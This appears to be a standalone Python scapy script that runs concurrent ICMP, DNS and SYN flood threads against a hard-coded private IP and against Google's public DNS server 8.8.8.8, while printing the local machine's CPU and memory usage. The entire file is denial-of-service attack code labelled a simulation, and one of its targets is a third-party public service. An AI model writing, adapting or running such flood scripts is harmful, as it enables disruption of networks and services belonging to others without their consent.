import psutil
import time
from scapy.all import *
from threading import Thread

# Target IP and Port Configuration
target_ip = "192.168.100.4"  # Correct target IP address
target_dns = "8.8.8.8"  # DNS Server for flooding (Google DNS)
target_port = 80  # Port for SYN flooding (HTTP)
interface = "eth0"  # Network interface (adjust if needed)

# Function to simulate ICMP Flood
def icmp_flood():
    print("Starting ICMP flood...")
    while True:
        send(IP(dst=target_ip)/ICMP(), verbose=False)
        # Track and display CPU and memory usage
        track_cpu_memory("ICMP")
        time.sleep(1)

# Function to simulate DNS Flood
def dns_flood():
    print("Starting DNS flood...")
    while True:
        send(IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com")), verbose=False)
        # Track and display CPU and memory usage
        track_cpu_memory("DNS")
        time.sleep(1)

# Function to simulate SYN Flood
def syn_flood():
    print("Starting SYN flood...")
    while True:
        send(IP(dst=target_ip)/TCP(dport=target_port, flags="S"), verbose=False)
        # Track and display CPU and memory usage
        track_cpu_memory("SYN")
        time.sleep(1)

# Function to track and display CPU and memory usage
def track_cpu_memory(flood_type):
    # Get current CPU and memory usage
    cpu = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory().percent
    print(f"{flood_type} Flood - CPU Usage: {cpu}% | Memory Usage: {memory}%")

# Start attack simulation
if __name__ == "__main__":
    # Threads to handle each flooding attack concurrently
    icmp_thread = Thread(target=icmp_flood)
    dns_thread = Thread(target=dns_flood)
    syn_thread = Thread(target=syn_flood)

    # Start all threads
    icmp_thread.start()
    dns_thread.start()
    syn_thread.start()

    # Keep the script running
    icmp_thread.join()
    dns_thread.join()
    syn_thread.join()
